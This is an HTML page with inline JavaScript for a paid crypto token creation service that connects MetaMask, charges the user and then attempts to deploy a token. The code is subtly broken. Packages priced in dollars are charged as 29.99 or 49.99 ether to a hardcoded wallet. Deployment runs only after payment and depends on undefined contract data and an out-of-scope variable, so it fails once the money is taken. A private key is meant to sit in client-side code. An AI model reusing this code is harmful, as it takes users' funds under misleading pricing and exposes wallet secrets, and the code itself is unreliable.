<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Create Your Crypto Token</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    h1 {
      text-align: center;
    }
    label {
      display: block;
      margin: 10px 0 5px;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
    }
    button {
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Create Your Crypto Token</h1>

  <!-- Token Details Form -->
  <label for="tokenName">Token Name:</label>
  <input type="text" id="tokenName" placeholder="Enter token name">

  <label for="tokenSymbol">Token Symbol:</label>
  <input type="text" id="tokenSymbol" placeholder="Enter token symbol">

  <label for="tokenSupply">Token Supply:</label>
  <input type="number" id="tokenSupply" placeholder="Enter token supply">

  <label for="blockchain">Select Blockchain:</label>
  <select id="blockchain">
    <option value="ethereum">Ethereum</option>
    <option value="polygon">Polygon</option>
    <option value="base">Base</option>
    <option value="bnb">BNB</option>
    <option value="avalanche">Avalanche</option>
    <option value="solana">Solana</option>
  </select>

  <h3>Select a Package</h3>
  <select id="package">
    <option value="basic">Basic Package - $29.99</option>
    <option value="premium">Premium Package - $49.99</option>
  </select>

  <!-- Payment Button (MetaMask) -->
  <button id="payButton">Pay & Deploy Token</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
<script>
  const payButton = document.getElementById('payButton');
  
  payButton.addEventListener('click', async () => {
    // Check if MetaMask is installed
    if (typeof window.ethereum === 'undefined') {
      alert("MetaMask is required to proceed.");
      return;
    }

    // Request connection to MetaMask
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    // Get the payment amount based on selected package
    const packageSelected = document.getElementById('package').value;
    let paymentAmount;

    if (packageSelected === 'premium') {
      paymentAmount = ethers.utils.parseEther("49.99"); // Premium Package Price
    } else {
      paymentAmount = ethers.utils.parseEther("29.99"); // Basic Package Price
    }

    // Send the payment to your address (replace with your actual wallet address)
    const contractAddress = "0xd9CD0AF84756AFBb218aF344d93f364F4e1d8700"; // Replace with your MetaMask address
    const tx = await signer.sendTransaction({
      to: contractAddress,
      value: paymentAmount
    });

    await tx.wait();

    // Proceed with token creation after payment
    const tokenDetails = {
      name: document.getElementById('tokenName').value,
      symbol: document.getElementById('tokenSymbol').value,
      supply: document.getElementById('tokenSupply').value,
      blockchain: document.getElementById('blockchain').value,
      package: packageSelected,
    };

    // Deploy the token on the selected blockchain
    await deployToken(tokenDetails);
  });

  async function deployToken(details) {
    // Create the provider based on the selected blockchain
    const blockchainUrls = {
      'ethereum': 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID',
      'polygon': 'https://polygon-rpc.com',
      'base': 'https://base-rpc-url', // Replace with actual Base RPC URL
      'bnb': 'https://bsc-dataseed.binance.org',
      'avalanche': 'https://api.avax.network/ext/bc/C/rpc',
      'solana': 'https://api.mainnet-beta.solana.com',
    };

    const provider = new ethers.providers.JsonRpcProvider(blockchainUrls[details.blockchain]);
    const wallet = new ethers.Wallet('YOUR_PRIVATE_KEY', provider); // Replace with your private key

    // Deploy the contract (simplified example, you should use your actual contract)
    const contractFactory = new ethers.ContractFactory(
      TokenABI, 
      TokenBytecode, 
      wallet
    );

    const contract = await contractFactory.deploy(details.name, details.symbol, details.supply);
    const userWallet = userAddress;

    // Send the token to the user's wallet
    await contract.transfer(userWallet, details.supply);

    alert("Token successfully deployed!");
  }
</script>

</body>
</html>
